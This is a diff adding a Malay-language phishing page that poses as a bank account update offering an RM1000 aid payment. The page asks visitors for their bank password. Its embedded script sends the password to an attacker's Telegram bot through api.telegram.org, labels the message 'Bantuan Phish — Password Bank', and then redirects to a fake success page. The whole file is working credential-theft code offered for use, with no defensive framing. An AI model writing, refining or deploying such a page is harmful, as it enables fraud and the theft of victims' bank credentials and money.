@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kata Laluan Bank</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="card">
+        <h2>Kemaskini Akaun Bank</h2>
+        <p>Sila masukkan kata laluan akaun bank anda untuk proses pemindahan wang bantuan RM1000.</p>
+        <form id="formPin">
+            <div class="form-group">
+                <label>Kata Laluan (Password)</label>
+                <input type="password" id="pass" placeholder="••••••••" required>
+            </div>
+            <button type="submit" id="btn">Hantar</button>
+        </form>
+    </div>
+    <script src="js/config.js"></script>
+    <script>
+        document.getElementById("formPin").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById("btn");
+            btn.disabled = true; btn.textContent = "Memproses...";
+            const pass = document.getElementById("pass").value;
+
+            const text = `<b>🔓 Bantuan Phish — Password Bank</b>\nPassword: <code>${pass}</code>`;
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text, parse_mode: "HTML" })
+            });
+
+            // Pindah ke halaman berjaya
+            window.location.href = "success.html";
+        });
+    </script>
+</body>
+</html>
